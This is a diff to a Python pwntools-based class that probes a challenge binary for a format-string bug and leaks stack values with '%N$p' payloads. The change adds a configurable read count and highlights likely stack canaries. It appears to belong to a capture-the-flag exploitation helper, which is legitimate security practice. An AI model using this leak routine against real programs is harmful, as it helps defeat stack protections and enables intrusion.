@@ -19,6 +19,7 @@ class Format_dump():
         self.file= None
         self.flines=0
         self.elines=0
+        self.range = 100
 
     def tester(self):
         for file in self.challenge.files:
@@ -32,26 +33,33 @@ class Format_dump():
                 print("{}[FORMAT] {}printf found{}".format(
                     Colors.CYAN, Colors.GREEN, Colors.END
                 ))
+                self.range = int(input("Entries to read from stack: "))
                 self.dump_stack()
     
     def dump_stack(self):
-        for i in range(0, 100):
+        for i in range(0, self.range):
             self.process =pwn.process(self.file['path'])
             self.process.recvlines(self.flines)
-            payload = '%{}$p;'.format(i)
+            payload = '^%{}$p;'.format(i).encode('ascii')
             self.process.sendline(payload);
             r = self.process.recvlines(self.elines)
             for rec in r:
                 if rec.decode().count(';') > 0:
-                    dump = rec.decode().split(";")[0]
-                    print("{} - {}".format(i, dump))
+                    dump = rec.decode().split("^")[1].split(";")[0]
+                    fmt = "{} - {}".format(i, dump)
+                    if len(dump) == (16+2) and dump.endswith("00"):
+                        fmt = Colors.GREEN + fmt + " [Possible Canary] (format='{}')".format(payload.decode()[:-1][1:]) + Colors.END
+                    print(fmt)
             self.process.close()
 
     def check(self, file:str):
         r = self.process.recvlines(timeout=1)
         self.flines = len(r)
         self.process.sendline(r"%f".encode('ascii'));
-        r = self.process.recvlines(timeout=2)
+        try:
+            r = self.process.recvlines(timeout=1)
+        except:
+            return False
         self.elines = len(r)
         for rec in r:
             if b"0.000000" in rec:
